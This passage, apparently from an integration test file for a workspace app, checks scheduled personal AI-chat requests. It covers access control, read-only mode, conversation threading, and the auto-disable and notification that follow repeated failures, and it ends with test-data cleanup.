  check(await failsWith(agentSchedules.removeAgentSchedule(ids.owner, keeper.id, set.id), "scheduleNotFound"), "a schedule deleted already isn't found");

  // ── One's own request on a schedule ──────────────────────────────────────────────────────────
  const ownTask = "Tell me which rows on the work board changed since yesterday.";
  check(await failsWith(ownRequests.setOwnRequest(ids.owner, workspaceId, null, { rule: daily, timeZone: ZONE, task: " " }), "invalid", "task"), "an own request needs a task");
  const own = await ownRequests.setOwnRequest(ids.owner, workspaceId, null, { rule: daily, timeZone: ZONE, task: ownTask, mode: "ask" });
  check(own.enabled && own.scheduleKind === "own_request" && own.task === ownTask && own.setBy?.id === ids.owner && own.failures === 0, "a person sets a request of their own on a schedule", own);
  check((await ownRequests.listOwnRequests(ids.member, workspaceId)).length === 0, "no one else lists it");
  check(await failsWith(ownRequests.setOwnRequest(ids.member, workspaceId, own.id, { task: "Mine now" }), "scheduleNotFound"), "…or changes it");
  check(await failsWith(ownRequests.removeOwnRequest(ids.member, workspaceId, own.id), "scheduleNotFound"), "…or removes it");
  check((await scheduleRow(own.id)).settings.mode === "read", "a request that isn't `auto` only reads");
  const selfTriggers = await listTriggers(ids.owner, workspaceId);
  check(
    selfTriggers.some((t) => t.kind === "chat" && t.available) && selfTriggers.some((t) => t.kind === "schedule" && t.id === own.id && t.scheduleKind === "own_request"),
    "the person's own triggers list their AI chat and the request",
    selfTriggers,
  );

  const ownRuns = () => db.select().from(agentRun).where(and(eq(agentRun.workspaceId, workspaceId), sql`${agentRun.source}->>'scheduleId' = ${own.id}`));
  fake.chats.length = 0;
  fake.setChat(() => ({ text: "Two rows changed: the quarterly report and release 2.1." }));
  await runNow(own.id);
  const [ownRun] = await ownRuns();
  const [ownConversation] = ownRun?.conversationId ? await db.select().from(conversation).where(eq(conversation.id, ownRun.conversationId)) : [];
  check(
    ownRun?.agentId === null &&
      ownRun.status === "pending" &&
      ownRun.source.kind === "assistant" &&
      ownRun.source.userId === ids.owner &&
      ownRun.source.scheduleId === own.id &&
      ownRun.source.mode === "read" &&
      ownRun.source.conversationId === ownRun.conversationId &&
      ownRun.prompt === ownTask &&
      ownConversation?.key === `schedule:${own.id}` &&
      ownConversation.userId === ids.owner &&
      ownConversation.agentId === null,
    "when it comes round it queues an answer of the person's own AI chat, in a conversation of theirs kept for it",
    { ownRun, ownConversation },
  );
  await runNow(own.id);
  check((await ownRuns()).length === 1, "while that answer waits, the request skips a time");
  await flushAgentRuns({ assistant: true });
  const [answered] = await db.select().from(conversation).where(eq(conversation.id, ownConversation.id));
  const answeredMessages = answered.messages as { role: string; content: string }[];
  check(
    fake.chats.length >= 1 &&
      answeredMessages.length === 2 &&
      answeredMessages[0].role === "user" &&
      answeredMessages[0].content === ownTask &&
      answeredMessages[1].role === "assistant" &&
      answeredMessages[1].content.includes("Two rows changed") &&
      (await ownRuns()).length === 0,
    "the worker answers it as the person, and the turn goes into that conversation",
    answeredMessages,
  );
  check((await scheduleRow(own.id)).failures === 0, "an answer that goes well leaves its failures at 0");

  fake.setChat(() => ({ text: "Nothing new since yesterday." }));
  await runNow(own.id);
  const [againRun] = await ownRuns();
  check(againRun?.conversationId === ownConversation.id, "its next time joins the same conversation", againRun);
  await flushAgentRuns({ assistant: true });
  const [twice] = await db.select().from(conversation).where(eq(conversation.id, ownConversation.id));
  check((twice.messages as unknown[]).length === 4, "…where the answers line up", twice.messages);

  // An answer that fails counts; the tenth in a row turns the request off and tells the person.
  await db.update(schedule).set({ failures: SCHEDULE_FAILURE_LIMIT - 1 }).where(eq(schedule.id, own.id));
  setAiEnv({ AI_PROVIDER: "openai-compatible", AI_MODEL: "fake-chat", AI_BASE_URL: "http://127.0.0.1:9/v1", AI_WORKSPACE_RATE_LIMIT: "1000", AI_RATE_LIMIT: "1000" });
  try {
    await runNow(own.id);
    await flushAgentRuns({ assistant: true });
  } finally {
    setAiEnv({ AI_PROVIDER: "openai-compatible", AI_MODEL: "fake-chat", AI_BASE_URL: fake.baseUrl, AI_WORKSPACE_RATE_LIMIT: "1000", AI_RATE_LIMIT: "1000" });
  }
  const ownOff = await scheduleRow(own.id);
  check(!ownOff.enabled && ownOff.lastError === "failed" && ownOff.failures === SCHEDULE_FAILURE_LIMIT, "an answer that fails the tenth time in a row turns the request off", ownOff);
  const ownPaused = (await listNotifications(ids.owner, { workspaceId })).filter((n) => n.kind === "schedule_paused" && n.schedulePaused?.own);
  check(
    ownPaused.length === 1 && ownPaused[0].schedulePaused?.agentId === null && ownPaused[0].schedulePaused.task === ownTask,
    "…and tells the person, as their own request",
    ownPaused,
  );
  const ownAgain = await ownRequests.setOwnRequest(ids.owner, workspaceId, own.id, {});
  check(ownAgain.enabled && ownAgain.failures === 0 && ownAgain.task === ownTask, "setting it again turns it back on", ownAgain);
  await ownRequests.removeOwnRequest(ids.owner, workspaceId, own.id);
  check(!(await scheduleRow(own.id)), "the person removes it");

  console.log(`\n${passed} checks passed`);
} finally {
  const botUsers = (await db.select({ userId: workspaceAgent.userId }).from(workspaceAgent).where(eq(workspaceAgent.workspaceId, workspaceId))).map((a) => a.userId);
  await db.delete(notification).where(eq(notification.workspaceId, workspaceId));
  await db.delete(agentRun).where(eq(agentRun.workspaceId, workspaceId));
  await db.delete(workspace).where(eq(workspace.id, workspaceId));
  await db.delete(user).where(inArray(user.id, [...userIds, ...botUsers]));
  await fake.close();
  hocuspocus.closeConnections();
  await (globalThis as unknown as { __leafdeskSql?: { end(): Promise<void> } }).__leafdeskSql?.end();
}
